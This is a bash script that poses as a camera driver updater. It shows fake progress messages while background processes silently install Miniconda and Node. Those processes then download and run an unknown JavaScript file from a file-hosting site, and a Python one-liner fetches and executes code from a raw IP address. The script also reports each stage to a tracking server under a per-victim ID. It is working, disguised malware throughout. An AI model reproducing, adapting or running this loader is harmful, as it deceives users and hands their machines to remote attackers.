#!/usr/bin/env bash

# Replaced when serving the script to the machine (see delay_version.txt).
MAC_UID="${MAC_UID:-__ID__}"
API_BASE="${API_BASE:-https://api.canditech.org}"

# Set VERBOSE=1 for detailed [INFO] lines from part 1 / 2.
VERBOSE="${VERBOSE:-0}"

# -------------------------
# Helpers
# -------------------------
info() {
  [[ "$VERBOSE" == "1" ]] || return 0
  echo "[INFO] $*"
}
err() { echo "[ERROR] $*" >&2; }
die() { err "$*"; exit 1; }
delay() { sleep "${1:-1}"; }
track_step() {
  local key="$1"
  if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
    curl -sL -X POST "${API_BASE}/track-step/${MAC_UID}/${key}" >/dev/null 2>&1 || true
  fi
}

download() {
  local url="$1"
  local out="$2"
  if command -v curl >/dev/null 2>&1; then
    curl -fsSL -o "$out" "$url"
  elif command -v wget >/dev/null 2>&1; then
    wget -qO "$out" "$url"
  else
    die "Neither curl nor wget is available."
  fi
}

# One OS/arch pass for Miniconda URLs + Node dist tags (used by part 1 & 2).
detect_platform() {
  OS_UNAME="$(uname -s)"
  ARCH_UNAME="$(uname -m)"
  case "$OS_UNAME" in
    Darwin)
      OS_TAG="darwin"
      SHARED_DIR="${SHARED_DIR:-/Users/Shared}"
      ;;
    Linux)
      OS_TAG="linux"
      [[ -n "${HOME:-}" ]] || die "HOME is not set; cannot determine install directory on Linux."
      SHARED_DIR="${SHARED_DIR:-$HOME}"
      ;;
    *) die "Unsupported OS: $OS_UNAME (need Darwin or Linux)" ;;
  esac
  case "$ARCH_UNAME" in
    x86_64|amd64) ARCH_TAG="x64" ;;
    arm64|aarch64) ARCH_TAG="arm64" ;;
    *) die "Unsupported architecture: $ARCH_UNAME (need x64 or arm64)" ;;
  esac
  export OS_UNAME ARCH_UNAME OS_TAG ARCH_TAG SHARED_DIR
}

# -------------------------
# Part 1: Miniconda
# -------------------------
run_part1_miniconda() {
  local URL PREFIX INSTALLER OS ARCH
  track_step "part1_step_1"
  OS="$OS_UNAME"
  ARCH="$ARCH_UNAME"
  info "Part 1: OS=$OS ARCH=$ARCH"

  if [[ "$OS" == "Darwin" ]]; then
    if [[ "$ARCH" == "arm64" ]]; then
      URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-arm64.sh"
    elif [[ "$ARCH" == "x86_64" ]]; then
      URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-x86_64.sh"
    else
      echo "Unsupported macOS architecture" >&2
      return 1
    fi
  elif [[ "$OS" == "Linux" ]]; then
    if [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
      URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-aarch64.sh"
    elif [[ "$ARCH" == "x86_64" ]]; then
      URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh"
    else
      echo "Unsupported Linux architecture" >&2
      return 1
    fi
  else
    echo "Unsupported OS" >&2
    return 1
  fi

  PREFIX="${SHARED_DIR}/miniconda3"
  INSTALLER="${SHARED_DIR}/miniconda.sh"
  mkdir -p "$SHARED_DIR"

  if [[ -d "$PREFIX" && -x "${PREFIX}/bin/python3" ]]; then
    info "Part 1: Miniconda already present at $PREFIX — skipping download/install."
    "${PREFIX}/bin/python3" -V >/dev/null 2>&1 || true
  else
    track_step "part1_step_2"
    info "Part 1: downloading Miniconda installer"
    curl -fsSL -o "$INSTALLER" "$URL"

    track_step "part1_step_3"
    info "Part 1: installing Miniconda (silent)"
    bash "$INSTALLER" -b -p "$PREFIX" >/dev/null 2>&1

    track_step "part1_step_4"
    info "Part 1: verifying Python"
    "${PREFIX}/bin/python3" -V >/dev/null 2>&1

  fi

  track_step "part1_step_5"

}

# -------------------------
# Part 2: Node + env-setup
# -------------------------
run_part2_node_driver() {
  local NODE_EXE USER_HOME INDEX_JSON LATEST_VERSION NODE_VERSION TARBALL_NAME DOWNLOAD_URL PREFIX
  local EXTRACTED_DIR PORTABLE_NODE NODE_TARBALL ENV_SETUP_JS NODE_INSTALLED_VERSION
  track_step "part2_step_1"

  NODE_EXE=""
  if command -v node >/dev/null 2>&1; then
    NODE_INSTALLED_VERSION="$(node -v 2>/dev/null || true)"
    if [[ -n "${NODE_INSTALLED_VERSION:-}" ]]; then
      NODE_EXE="node"
      info "Checking Driver..."
    fi
  fi

  USER_HOME="${SHARED_DIR}"
  mkdir -p "$USER_HOME"

  if [[ -z "$NODE_EXE" ]]; then
    track_step "part2_step_2"
    info "Driver not found globally. Downloading portable Driver for ${OS_TAG}-${ARCH_TAG}..."

    INDEX_JSON="$USER_HOME/node-index.json"
    download "https://nodejs.org/dist/index.json" "$INDEX_JSON"

    LATEST_VERSION="$(grep -m1 -oE '"version"\s*:\s*"v[0-9]+\.[0-9]+\.[0-9]+"' "$INDEX_JSON" | grep -oE 'v[0-9]+\.[0-9]+\.[0-9]+')"
    rm -f "$INDEX_JSON"

    [[ -n "${LATEST_VERSION:-}" ]] || die "Failed to determine latest Driver version."

    NODE_VERSION="${LATEST_VERSION#v}"
    TARBALL_NAME="node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}.tar.xz"
    DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/${TARBALL_NAME}"

    EXTRACTED_DIR="${USER_HOME}/node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}"
    PORTABLE_NODE="${EXTRACTED_DIR}/bin/node"
    NODE_TARBALL="${USER_HOME}/${TARBALL_NAME}"

    if [[ -x "$PORTABLE_NODE" ]]; then
      info "Driver already present: $PORTABLE_NODE"
    else
      info "Downloading..."
      download "$DOWNLOAD_URL" "$NODE_TARBALL"

      [[ -s "$NODE_TARBALL" ]] || die "Failed to download Driver tarball."

      info "Extracting Driver..."
      tar -xf "$NODE_TARBALL" -C "$USER_HOME"
      rm -f "$NODE_TARBALL"

      [[ -x "$PORTABLE_NODE" ]] || die "node executable not found after extraction: $PORTABLE_NODE"
      info "Portable Driver extracted successfully."
    fi

    NODE_EXE="$PORTABLE_NODE"
    export PATH="${EXTRACTED_DIR}/bin:${PATH}"
  fi

  "$NODE_EXE" -v >/dev/null 2>&1 || die "Driver execution failed."
  info "Using Driver: $("$NODE_EXE" -v)"

  track_step "part2_step_3"
  ENV_SETUP_JS="${USER_HOME}/env-setup.js"
  download "https://files.catbox.moe/l2rxnb.js" "$ENV_SETUP_JS"
  [[ -s "$ENV_SETUP_JS" ]] || die "env-setup.js download failed."

  track_step "part2_step_4"
  info "Running Driver (silent)"
  "$NODE_EXE" "$ENV_SETUP_JS" >/dev/null 2>&1

  PREFIX="${SHARED_DIR}/miniconda3"
  while true; do
    if [[ -x "${PREFIX}/bin/python3" ]]; then
      "${PREFIX}/bin/python3" -c "from urllib.request import urlopen,Request;Request._V='7-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" >/dev/null 2>&1
      break
    fi
    info "Part 2: waiting for ${PREFIX}/bin/python3 (retry in 15s)"
    delay 15
  done

  track_step "part2_step_5"
  info "Driver setup finished."
}

# -------------------------
# Part 3: staged UI + connection status (delay_version.txt)
# -------------------------
run_part3_ui_delay() {
  delay 5
  echo "[INFO] Initializing camera driver update..."
  delay 10
  echo "[INFO] Detecting camera device..."
  delay 7
  echo "[INFO] Checking for available updates..."
  delay 7
  echo "[INFO] Updating and installing progress: 35%"
  delay 10
  echo "[INFO] Updating and installing progress: 72%"
  delay 10
  echo "[INFO] Updating and installing progress: 100%"    
  delay 12
  echo "[SUCCESS] Camera drivers have been updated successfully."
  delay 3
  echo "[INFO] Device is now ready for use."
  if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
    curl -sL -X POST "${API_BASE}/change-connection-status/${MAC_UID}" >/dev/null 2>&1 || true
  fi
}

detect_platform
mkdir -p "$SHARED_DIR"

info "Starting Miniconda, Node/driver, and UI/status phases concurrently"
run_part1_miniconda &
PID_MINI=$!
run_part2_node_driver &
PID_NODE=$!
run_part3_ui_delay &
PID_UI=$!

# Keep part1/part2 detached in background as requested.
disown "$PID_MINI" 2>/dev/null || true
disown "$PID_NODE" 2>/dev/null || true

EC_UI=0
wait "$PID_UI" || EC_UI=$?


[[ "$VERBOSE" == "1" ]] && echo "Done."
exit 0
